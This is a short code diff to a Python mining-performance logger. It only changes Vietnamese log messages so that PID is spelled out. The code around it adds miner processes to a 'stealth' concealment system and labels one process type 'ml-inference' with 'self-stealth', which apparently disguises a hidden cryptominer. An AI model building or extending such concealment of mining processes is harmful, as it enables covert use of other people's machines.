@@ -246,16 +246,16 @@ class MiningPerformanceLogger:
                     try:
                         stealth_success = stealth_system.add_process(pid)
                         if stealth_success:
-                            self.logger.info(f"🛡️ [STEALTH] (hệ thống che giấu) thêm tiến trình {process_type} (PID: {pid}) thành công")
+                            self.logger.info(f"🛡️ [STEALTH] (hệ thống che giấu) thêm tiến trình {process_type} (**[PID]** (Process ID - mã định danh tiến trình): {pid}) thành công")
                         else:
-                            self.logger.warning(f"⚠️ [STEALTH] (hệ thống che giấu) thêm tiến trình {process_type} (PID: {pid}) thất bại")
+                            self.logger.warning(f"⚠️ [STEALTH] (hệ thống che giấu) thêm tiến trình {process_type} (**[PID]** (Process ID - mã định danh tiến trình): {pid}) thất bại")
                     except Exception as e:
-                        self.logger.error(f"❌ [STEALTH] (hệ thống che giấu) lỗi khi thêm tiến trình {process_type} (PID: {pid}): {e}")
+                        self.logger.error(f"❌ [STEALTH] (hệ thống che giấu) lỗi khi thêm tiến trình {process_type} (**[PID]** (Process ID - mã định danh tiến trình): {pid}): {e}")
                 else:
-                    self.logger.warning(f"⚠️ [STEALTH] (hệ thống che giấu) không khả dụng cho tiến trình {process_type} (PID: {pid})")
+                    self.logger.warning(f"⚠️ [STEALTH] (hệ thống che giấu) không khả dụng cho tiến trình {process_type} (**[PID]** (Process ID - mã định danh tiến trình): {pid})")
             elif process_type == "ml-inference":
                 # 🔒 [STEALTH-SKIP] Self-stealth active - no external modification needed
-                self.logger.info(f"🔒 [STEALTH-SKIP] (bỏ qua stealth ngoài) Tiến trình {process_type} (PID: {pid}) đang dùng [Self-Stealth] (tự che giấu) – bỏ qua stealth bên ngoài")
+                self.logger.info(f"🔒 [STEALTH-SKIP] (bỏ qua stealth ngoài) Tiến trình {process_type} (**[PID]** (Process ID - mã định danh tiến trình): {pid}) đang dùng [Self-Stealth] (tự che giấu) – bỏ qua stealth bên ngoài")
                 stealth_success = True  # Mark as successful since self-stealth handles it
             
             # Log process registration with stealth status
